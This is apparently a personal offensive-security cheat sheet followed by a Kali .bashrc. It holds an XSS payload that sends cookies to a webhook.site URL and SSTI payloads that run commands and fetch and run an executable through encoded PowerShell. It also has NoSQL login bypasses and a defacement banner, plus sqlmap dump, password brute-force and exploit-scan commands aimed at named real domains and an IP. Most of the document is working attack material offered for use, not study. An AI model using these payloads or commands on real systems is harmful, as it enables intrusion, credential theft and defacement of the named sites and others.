# manuel

# akamai xss bypass 
```
<script>fetch("https://webhook.site/4dcdb1f2-0fbe-40e1-a90c-ca71732a7f1a?cookie=" + encodeURIComponent(document.cookie))</script>
```
```
<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;</font>
```
```
place"><svg+onload=confirm(document.domain)>
```
```
<A HREF="https://www.cia.gov/">Login Here </A>
```
```
<button onClick="alert('xss')">Submit</button>
```
```
"'>"<A HRef=" AutoFocus OnFocus=top//? >
```
```
"'>"<A HRef=" AutoFocus OnFocus=top//?['ale'%2B'rt'](document%2Bcookie)>
```
________
```
<iframe src="https://www.cia.gov" width="100%" height="500"></iframe>

```
______________________________
# Offensive payload
```
git clone https://github.com/InfoSecWarrior/Offensive-Payloads.git 
```
_______________________________
```
nuclei -u https://example.com -severity medium,high,critical
```
```
find . -type f -exec cat {} + 2>/dev/null | sort | uniq | anew | uro | httpx-toolkit -mc 200  | nuclei  -t /nuclei-templates/ --severity medium,high,critical
```
```
find . -type f -exec cat {} + 2>/dev/null |  gf lfi | httpx-toolkit -mc 200 | nuclei  -t /nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30
```
____________________________
# Web Cache Poisoning Params -----
 #### ngrok http 80 
```
X-Forwarded-Host: ngrok.com  
X-Host: ngrok.com
X-Forwarded-Server: ngrok.com 
```
_____________________________

### link-gopher : Web sitesindeki linkleri cikartir tek tek elle kopyala yapistir yapmazsin
______________________________

# hashcat icin wordlist
```
https://packetstormsecurity.com/Crackers/wordlists/page1/
```
```
https://labs.nettitude.com/tools/rocktastic/
```
```
https://github.com/J3rryBl4nks/PasswordCrackingMethodology
```
```
hashcat -m 300 -a 0 -o hashcikti3a.txt hashes5k.txt weakpass_3a/weakpass_3a
```
```
sqlmap -u 'https://updates.frontegg.com/en?featuremonth=*' --level=5 --risk=3 --random-agent --user-agent -v3 --batch --dbs tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords --technique=B --threads=10 -v3 --dump --dbms="Microsoft Access" | tee sqlSimpleMicrosoftDB.txt
```

____________________________
```
gobuster dir -w /usr/share/wordlists/dirb/common.txt --url 192.168.56.116
```
```
echo "http://arkas.com.tr" | waybackurls | gf xss | xargs -I {} injectx.py -u {}
```
```
wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt -z file,/usr/share/seclists/Passwords/darkweb2017-top100.txt --hc 200 -d "username=FUZZ&password=FUZ2Z" https://www.kamyonum.com.tr/edit/login.asp 
```
```
nmap -Pn -n --top-ports 5000 13.40.217.134 -sV -sC --version-all --script=vuln --script=auth --script=http-brute,snmp-brute --script=exploit --script=malware -o nmapExploitScan
```

```
<h1><A HREF="https://cia.gov/"><marquee>YOU HAVE BEEN HACKED by DedCrowd</marquee> </A>
```
```
https://github.com/reddelexc/hackerone-reports
```
____________________________
## SSTI 

```
{{ user }}
{{7*7}}
${7*7}
{$7*7
{{% for i in [1,2,3] %}} {{ i }} {{% endfor %}}
{{ 7*7 }}
${7*7}
{$7*7}
<%= 7*7 %>
<%= 7*7 %>
${{7*7}}
#{7*7}
{{ 7 * 7 }}
${ 7 * 7 }
{{= 7 * 7 =}}

```

```
java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
```
Ruby
{ 7 * 7 }
{ %x|env| }
Jinja2 Python
{{7*7}} = Error
${7*7} = ${7*7}
{{foobar}} Nothing
{{4*4}}[[5*5]]
{{7*'7'}} = 7777777
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
{{settings}}
<div data-gb-custom-block data-tag="debug"></div>
```

```
Moka Python
<%
import os
x=os.popen('id').read()
%>
${x}
```

```
Razor (.Net)
@(2+2) <= Success
@() <= Success
@("{{code}}") <= Success
@ <=Success
@{} <= ERROR!
@{ <= ERRROR!
@(1+2)
@( //C#Code )
@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");
@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");
```
# ssti payloads
```
{{2*2}}[[3*3]]
{{3*3}}
{{3*'3'}}
<%= 3 * 3 %>
${6*6}
${{3*3}}
@(6+5)
#{3*3}
#{ 3 * 3 }
*{7*7}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
```
```
https://github.com/reddelexc/hackerone-reports
```

# NoSQL Payloads Basic:
```
'&& 1 == 1
'&& '1' == '1
' || 1==1
' || '1'== '1
' || 1 ||
' || 1 || '
' && '1' == '1
```
# Login NoSQL Payloads

```json
{"username":{"$in":[
"admin",
"ADMIN",
"wiener"]},"password":{ // bu kisimda bize hep invalid dondururken 200 verdi fakat icinde wiener kondugu zaman 302 found verdi ve biz enumeraion etmis olduk/
"$ne":"dgdfdffdfdfdf"}}
```

```json
{"username":{"$regex":"^w"},"password":{
"$ne":"dgdfdffdfdfdf"}}
// w ile baslasin dedik ve bize wiener kullanicisini response da dondurdu Location: basliginda ve altindaki session bilgileri o kullanicinin oluyor response daki
//regex e a harfini yazdik ve gelen bilgideki sessionu aldik ve icerdeyiz
```
svg file upload vuln
```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <a xlink:href="http://go824ds8qmcbpz66m6qo29ria9g04qsf.oastify.com/pic.png">
    <text x="10" y="25">my text</text>
  </a>
</svg>

```
## Console Settings
```
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac                                                                                                                    
# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

# The following block is surrounded by two delimiters.
# These delimiters must not be modified. Thanks.
# START KALI CONFIG VARIABLES
PROMPT_ALTERNATIVE=twoline
NEWLINE_BEFORE_PROMPT=yes
# STOP KALI CONFIG VARIABLES

if [ "$color_prompt" = yes ]; then
    # override default virtualenv indicator in prompt
    VIRTUAL_ENV_DISABLE_PROMPT=1

    prompt_color='\[\033[;32m\]'
    info_color='\[\033[1;34m\]'
    prompt_symbol=㉿
    if [ "$EUID" -eq 0 ]; then # Change prompt colors for root user
        prompt_color='\[\033[;94m\]'
        info_color='\[\033[1;31m\]'
        # Skull emoji for root terminal
        #prompt_symbol=💀
    fi
case "$PROMPT_ALTERNATIVE" in
    twoline)
        PS1=$prompt_color'┌──${debian_chroot:+($debian_chroot)──}${VIRTUAL_ENV:+(\[\033[0;1m\]$(basename $VIRTUAL_ENV)'$prompt_color')}('$info_color'\u'$prompt_symbol'\[\033[0;32m\]DedCrowd'$prompt_color')-[\[\033[0;1m\]\w'$prompt_color']\n'$prompt_color'└─'$info_color'\$\[\033[0m\] ';;
    oneline)
        PS1='${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV)) }${debian_chroot:+($debian_chroot)}'$info_color'\u@\[\033[0;32m\]DedCrowd\[\033[00m\]:'$prompt_color'\[\033[01m\]\w\[\033[00m\]\$ ';;
    backtrack)
        PS1='${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV)) }${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\[\033[0;32m\]DedCrowd\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ ';;
esac

    unset prompt_color
    unset info_color
    unset prompt_symbol
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*|Eterm|aterm|kterm|gnome*|alacritty)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

[ "$NEWLINE_BEFORE_PROMPT" = yes ] && PROMPT_COMMAND="PROMPT_COMMAND=echo"

# enable color support of ls, less and man, and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    export LS_COLORS="$LS_COLORS:ow=30;44:" # fix ls color for folders with 777 permissions

    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
    alias diff='diff --color=auto'
    alias ip='ip --color=auto'

    export LESS_TERMCAP_mb=$'\E[1;31m'     # begin blink
    export LESS_TERMCAP_md=$'\E[1;36m'     # begin bold
    export LESS_TERMCAP_me=$'\E[0m'        # reset bold/blink
    export LESS_TERMCAP_so=$'\E[01;33m'    # begin reverse video
    export LESS_TERMCAP_se=$'\E[0m'        # reset reverse video
    export LESS_TERMCAP_us=$'\E[1;32m'     # begin underline
    export LESS_TERMCAP_ue=$'\E[0m'        # reset underline
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
export PATH=$PATH:$HOME/go/bin
[ "$(id -u)" -ne 0 ] && exec sudo -i

```
